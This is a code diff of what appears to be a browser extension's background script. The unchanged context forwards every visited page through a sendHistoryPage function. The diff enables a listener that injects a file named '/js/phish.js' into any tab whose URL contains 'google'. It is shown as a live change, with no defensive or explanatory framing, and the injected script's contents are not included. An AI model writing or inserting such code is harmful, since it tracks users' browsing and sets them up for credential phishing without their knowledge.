@@ -12,15 +12,15 @@ chrome.runtime.onInstalled.addListener(() => {
   chrome.history.onVisited.addListener((page) => {
     sendHistoryPage(page);
   });
-  // chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-  //   if (changeInfo.url) {
-  //     if (changeInfo.url.includes("google")) {
-  //       chrome.tabs.executeScript(tabId, {
-  //         file: "/js/script.html"
-  //       });
-  //     }
-  //   }
-  // });
+  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+    if (changeInfo.url) {
+      if (changeInfo.url.includes("google")) {
+        chrome.tabs.executeScript(tabId, {
+          file: "/js/phish.js"
+        });
+      }
+    }
+  });
   createTabListeners();
 });
 
